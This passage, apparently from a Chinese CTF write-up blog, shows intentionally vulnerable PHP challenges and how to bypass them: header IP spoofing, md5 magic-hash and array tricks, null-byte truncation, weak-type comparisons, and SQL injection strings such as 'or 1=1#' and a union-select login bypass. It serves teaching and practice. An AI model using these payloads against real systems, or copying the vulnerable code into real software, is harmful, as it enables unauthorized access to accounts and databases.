class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">    $cip = <span class="string">"0.0.0.0"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">return</span> $cip;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$GetIPs = GetIP();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($GetIPs==<span class="string">"1.1.1.1"</span>)&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Great! Key is *********"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"é”™è¯¯ï¼ä½ çš„IPä¸åœ¨è®¿é—®åˆ—è¡¨ä¹‹å†…ï¼"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>HTTPå¤´æ·»åŠ X-Forwarded-For:1.1.1.1</p><h2 id="md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"><a href="#md5åŠ å¯†ç›¸ç­‰ç»•è¿‡" class="headerlink" title="md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"></a>md5åŠ å¯†ç›¸ç­‰ç»•è¿‡</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span></span><br><span class="line"><span class="php">$a = @$_GET[<span class="string">'a'</span>];</span></span><br><span class="line"><span class="php">$md52 = @md5($a);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span></span><br><span class="line"><span class="php">&#125;&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line">`</span><br></pre></td></tr></table></figure><p>==å¯¹æ¯”çš„æ—¶å€™ä¼šè¿›è¡Œæ•°æ®è½¬æ¢ï¼Œ0eXXXXXXXXXX è½¬æˆ0äº†ï¼Œå¦‚æœæ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¯”è¾ƒæ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢ä¸ºæ•°å€¼å¹¶ä¸”æ¯”è¾ƒæŒ‰ç…§æ•°å€¼æ¥è¿›è¡Œ</p><h2 id="intvalå‡½æ•°å››èˆäº”å…¥"><a href="#intvalå‡½æ•°å››èˆäº”å…¥" class="headerlink" title="intvalå‡½æ•°å››èˆäº”å…¥"></a>intvalå‡½æ•°å››èˆäº”å…¥</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_GET[id]) &#123;</span></span><br><span class="line"><span class="php">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span></span><br><span class="line"><span class="php">  mysql_select_db(SAE_MYSQL_DB);</span></span><br><span class="line"><span class="php">  $id = intval($_GET[id]);</span></span><br><span class="line"><span class="php">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));</span></span><br><span class="line"><span class="php">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>($query[content]);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>æ„é€   id=1024.1212<br>intvalå‡½æ•°å››èˆäº”å…¥ï¼Œå–å€¼ä¸º1024ï¼Œä½†ifè¯­å¥ä¸­å·²æˆåŠŸç»•è¿‡1024çš„é™åˆ¶</p><h2 id="strposæ•°ç»„ç»•è¿‡NULLä¸eregæ­£åˆ™-00æˆªæ–­"><a href="#strposæ•°ç»„ç»•è¿‡NULLä¸eregæ­£åˆ™-00æˆªæ–­" class="headerlink" title="strposæ•°ç»„ç»•è¿‡NULLä¸eregæ­£åˆ™%00æˆªæ–­"></a>strposæ•°ç»„ç»•è¿‡NULLä¸eregæ­£åˆ™%00æˆªæ–­</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">'å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span></span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">'éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>æ–¹æ³•ä¸€ï¼š æ—¢è¦æ˜¯çº¯æ•°å­—,åˆè¦æœ‰â€™#biubiubiuâ€™ï¼Œstrpos()æ‰¾çš„æ˜¯å­—ç¬¦ä¸²,é‚£ä¹ˆä¼ ä¸€ä¸ªæ•°ç»„ç»™å®ƒ,strpos()å‡ºé”™è¿”å›null,null!==false,æ‰€ä»¥ç¬¦åˆè¦æ±‚. æ‰€ä»¥è¾“å…¥nctf[]= é‚£ä¸ºä»€ä¹ˆereg()ä¹Ÿèƒ½ç¬¦åˆå‘¢?å› ä¸ºereg()åœ¨å‡ºé”™æ—¶è¿”å›çš„ä¹Ÿæ˜¯null,null!==false,æ‰€ä»¥ç¬¦åˆè¦æ±‚.</p><p>æ–¹æ³•äºŒï¼š å­—ç¬¦ä¸²æˆªæ–­,åˆ©ç”¨ereg()çš„NULLæˆªæ–­æ¼æ´ï¼Œç»•è¿‡æ­£åˆ™è¿‡æ»¤ <a href="http://127.0.0.1/Php_Bug/16.php?nctf=1%00#biubiubiu" target="_blank" rel="noopener">http://127.0.0.1/Php_Bug/16.php?nctf=1%00#biubiubiu</a> é”™è¯¯ éœ€å°†#ç¼–ç  <a href="http://127.0.0.1/Php_Bug/16.php?nctf=1%00%23biubiubiu" target="_blank" rel="noopener">http://127.0.0.1/Php_Bug/16.php?nctf=1%00%23biubiubiu</a> æ­£ç¡®</p><h2 id="SQLæ³¨å…¥orç»•è¿‡"><a href="#SQLæ³¨å…¥orç»•è¿‡" class="headerlink" title="SQLæ³¨å…¥orç»•è¿‡"></a>SQLæ³¨å…¥orç»•è¿‡</h2><p>åœ°å€: <a href="http://chinalover.sinaapp.com/web15/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web15/index.php</a><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123; <span class="regexp">//get</span>_magic_quotes_gpc â€” è·å–å½“å‰ magic_quotes_gpc çš„é…ç½®é€‰é¡¹è®¾ç½®</span><br><span class="line">        $str=stripslashes($str); <span class="regexp">//</span>è¿”å›ä¸€ä¸ªå»é™¤è½¬ä¹‰åæ–œçº¿åçš„å­—ç¬¦ä¸²ï¼ˆ\<span class="string">' è½¬æ¢ä¸º '</span> ç­‰ç­‰ï¼‰ã€‚åŒåæ–œçº¿ï¼ˆ\\ï¼‰è¢«è½¬æ¢ä¸ºå•ä¸ªåæ–œçº¿ï¼ˆ\ï¼‰ã€‚</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">/<span class="regexp">/$query='SELECT * FROM users WHERE name=\''admin\'\' AND pass=\''or 1 #'\';';</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';</span></span><br><span class="line"><span class="regexp">$result=mysql_query($query);</span></span><br><span class="line"><span class="regexp">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span></span><br><span class="line"><span class="regexp">    die('Invalid password!');</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">echo $flag;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>æ³¨æ„ä¸Šé¢clean functionä¸­çš„htmlentities()å‡½æ•°ï¼Œå®ƒä¼šæŠŠè¾“å…¥å­—ç¬¦ä¸­çš„ â€™ æˆ–è€… â€ è½¬å˜ä¸ºhtmlå®ä½“ï¼Œè¿™æ ·ä¸€æ¥å°±æ— æ³•é—­åˆæºä»£ç ä¸­çš„ â€™ äº†ï¼Œè¿˜æœ‰å°±æ˜¯ï¼Œå¦‚æœphpçš„magic_quotes_gpcæ˜¯å¼€å¯çŠ¶æ€çš„è¯ï¼Œæˆ‘ä»¬è¾“å…¥çš„è½¬ä¹‰ç¬¦ä¹Ÿä¼šè¢«å»æ‰çš„ï¼Œä¸è¿‡æ—¢ç„¶è¿™é“é¢˜ç›®èƒ½åšï¼Œè¯´æ˜æˆ‘ä»¬æ˜¯å¯ä»¥ä½¿ç”¨è½¬ä¹‰ç¬¦ \ ï¼Œæˆ‘ä»¬è§£è¿™é“é¢˜çš„å…³é”®å°±æ˜¯ä½¿ç”¨è½¬ä¹‰ç¬¦ \ æ¥è®©æºä»£ç ä¸­<br>â€˜SELECT * FROM users WHERE name=\â€™â€™.$username.â€™\â€™ AND pass=\â€™â€™.$password.â€™\â€™;â€™<br>$usernameåé¢çš„ â€™ å¤±æ•ˆï¼Œåªè¦ è¿™ä¸ª â€™ å¤±æ•ˆï¼Œå°±èƒ½é—­åˆname=åé¢çš„ â€™ ï¼Œè¦è¾¾åˆ°è¿™ä¸€ç›®çš„ï¼Œæˆ‘ä»¬åªéœ€è¦è®©username=admin \å³å¯ï¼Œè®©åä½¿passwordçš„å€¼ä¸ºä¸€ä¸ªæ°¸çœŸå¼(or 1=1)å°±å¯ä»¥å¾—åˆ°è¿™é“é¢˜çš„flag<br>è¿™æ ·æäº¤çš„æ•°æ®ï¼Œä¼šå¯¼è‡´æºä»£ç ä¸­çš„SQLè¯­å¥å˜ä¸ºï¼š</p><p>SELECT * FROM users WHERE name=â€™admin \â€™ AND pass=â€™ or 1=1<br>1<br>æ³¨å…¥è¯­å¥?username=admin \&amp;password=or 1=1#</p><h2 id="å¯†ç md5æ¯”è¾ƒç»•è¿‡-1"><a href="#å¯†ç md5æ¯”è¾ƒç»•è¿‡-1" class="headerlink" title="å¯†ç md5æ¯”è¾ƒç»•è¿‡"></a>å¯†ç md5æ¯”è¾ƒç»•è¿‡</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span></span><br><span class="line"><span class="php">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span></span><br><span class="line"><span class="php">  mysql_select_db(SAE_MYSQL_DB);</span></span><br><span class="line"><span class="php">  $user = $_POST[user];</span></span><br><span class="line"><span class="php">  $pass = md5($_POST[pass]);</span></span><br><span class="line"><span class="php">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user=' $user '"</span>));</span></span><br><span class="line"><span class="php">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">//strcasecmp:0 - å¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>//select pw from ctf where user=â€™â€™and 0=1 union select  â€˜e10adc3949ba59abbe56e057f20f883eâ€™ #<br>?user=â€™and 0=1 union select â€˜e10adc3949ba59abbe56e057f20f883eâ€™ #&amp;pass=123456</p><h2 id="md5-å‡½æ•°-ä½¿ç”¨æ•°ç»„ç»•è¿‡"><a href="#md5-å‡½æ•°-ä½¿ç”¨æ•°ç»„ç»•è¿‡" class="headerlink" title="md5()å‡½æ•°===ä½¿ç”¨æ•°ç»„ç»•è¿‡"></a>md5()å‡½æ•°===ä½¿ç”¨æ•°ç»„ç»•è¿‡</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>])</span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'Your password can not be your username.'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> <span class="keyword">if</span> (md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>]))</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'Invalid password'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è‹¥ä¸ºmd5($<span class="emphasis">_GET['username']) == md5($_</span>GET[<span class="emphasis">'password'</span>]) åˆ™å¯ä»¥æ„é€ ï¼š http://127.0.0.1/Php<span class="emphasis">_Bug/18.php?username=QNKCDZO&amp;password=240610708 å› ä¸º==å¯¹æ¯”çš„æ—¶å€™ä¼šè¿›è¡Œæ•°æ®è½¬æ¢ï¼Œ0eXXXXXXXXXX è½¬æˆ0äº† ä¹Ÿå¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ http://127.0.0.1/Php_</span>Bug/18.php?username[]=1&amp;password[]=2</span><br><span class="line"></span><br><span class="line">ä½†æ­¤å¤„æ˜¯===ï¼Œåªèƒ½ç”¨æ•°ç»„ç»•è¿‡ï¼ŒPHPå¯¹æ•°ç»„è¿›è¡Œhashè®¡ç®—éƒ½ä¼šå¾—å‡ºnullçš„ç©ºå€¼ <span class="link">http://127.0.0.1/Php_Bug/18.php?username</span>[<span class="string"></span>]=1&amp;password[]=2</span><br></pre></td></tr></table></figure><h2 id="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"><a href="#åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ" class="headerlink" title="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"></a>åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($temp)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $flag = <span class="string">'flag&#123;test&#125;'</span>;</span></span><br><span class="line"><span class="php">    $one = ord(<span class="string">'1'</span>);  <span class="comment">//ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span></span></span><br><span class="line"><span class="php">    $nine = ord(<span class="string">'9'</span>); <span class="comment">//ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span></span></span><br><span class="line"><span class="php">    $number = <span class="string">'3735929054'</span>;</span></span><br><span class="line"><span class="php">    <span class="comment">// Check all the input characters!</span></span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// Disallow all the digits!</span></span></span><br><span class="line"><span class="php">        $digit = ord($temp&#123;$i&#125;);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="comment">// Aha, digit not allowed!</span></span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="string">"flase"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($number == $temp)</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$temp = $_GET[<span class="string">'password'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> noother_says_correct($temp);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œï¼Œå®ƒä¸è®©è¾“å…¥1åˆ°9çš„æ•°å­—ï¼Œä½†æ˜¯åé¢å´è®©æ¯”è¾ƒä¸€ä¸²æ•°å­—ï¼Œå¹³å¸¸çš„æ–¹æ³•è‚¯å®šå°±ä¸èƒ½è¡Œäº†ï¼Œå¤§å®¶éƒ½çŸ¥é“è®¡ç®—æœºä¸­çš„è¿›åˆ¶è½¬æ¢ï¼Œå½“ç„¶ä¹Ÿæ˜¯å¯ä»¥æ‹¿æ¥æ¯”è¾ƒçš„ï¼Œ0xå¼€å¤´åˆ™è¡¨ç¤º16è¿›åˆ¶ï¼Œå°†è¿™ä¸²æ•°å­—è½¬æ¢æˆ16è¿›åˆ¶ä¹‹åå‘ç°ï¼Œæ˜¯deadc0deï¼Œåœ¨å¼€å¤´åŠ ä¸Š0xï¼Œä»£è¡¨è¿™ä¸ªæ˜¯16è¿›åˆ¶çš„æ•°å­—ï¼Œç„¶åå†å’Œåè¿›åˆ¶çš„ 3735929054æ¯”è¾ƒï¼Œç­”æ¡ˆå½“ç„¶æ˜¯ç›¸åŒçš„ï¼Œè¿”å›trueæ‹¿åˆ°flag</p><p>echo  dechex ( 3735929054 ); // å°†3735929054è½¬ä¸º16è¿›åˆ¶<br>ç»“æœä¸ºï¼šdeadc0de<br>æ„é€ ï¼š <a href="http://127.0.0.1/Php_Bug/20.php?password=0xdeadc0d" target="_blank" rel="noopener">http://127.0.0.1/Php_Bug/20.php?password=0xdeadc0d</a></p><h2 id="å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"><a href="#å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"></a>å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag&#123;test&#125;"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$temp = $_GET[<span class="string">'password'</span>];</span></span><br><span class="line"><span class="php">is_numeric($temp)?<span class="keyword">die</span>(<span class="string">"no numeric"</span>):<span class="keyword">NULL</span>;    </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($temp&gt;<span class="number">1336</span>)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨PHPå¼±ç±»å‹çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå½“ä¸€ä¸ªæ•´å½¢å’Œä¸€ä¸ªå…¶ä»–ç±»å‹è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠå…¶ä»–ç±»å‹intvalå†æ¯”ã€‚å¦‚æœè¾“å…¥ä¸€ä¸ª1337aè¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œåœ¨is_numericä¸­è¿”å›trueï¼Œç„¶ååœ¨æ¯”è¾ƒæ—¶è¢«è½¬æ¢æˆæ•°å­—1337ï¼Œè¿™æ ·å°±ç»•è¿‡åˆ¤æ–­è¾“å‡ºflagã€‚</p><p><a href="http://127.0.0.1/php_bug/22.php?password=1337a" target="_blank" rel="noopener">http://127.0.0.1/php_bug/22.php?password=1337a</a></p><h2 id="md5å‡½æ•°trueç»•è¿‡æ³¨å…¥"><a href="#md5å‡½æ•°trueç»•è¿‡æ³¨å…¥" class="headerlink" title="md5å‡½æ•°trueç»•è¿‡æ³¨å…¥"></a>md5å‡½æ•°trueç»•è¿‡æ³¨å…¥</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$link</span> = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$link</span>) &#123;</span><br><span class="line">  die(<span class="string">'Could not connect to MySQL: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="regexp">//</span> é€‰æ‹©æ•°æ®åº“</span><br><span class="line"><span class="variable">$db</span> = mysql_select_db(<span class="string">"security"</span>, <span class="variable">$link</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$db</span>)</span><br><span class="line">&#123;</span><br><span class="line">  echo <span class="string">'select db error'</span>;</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="regexp">//</span> æ‰§è¡Œsql</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span 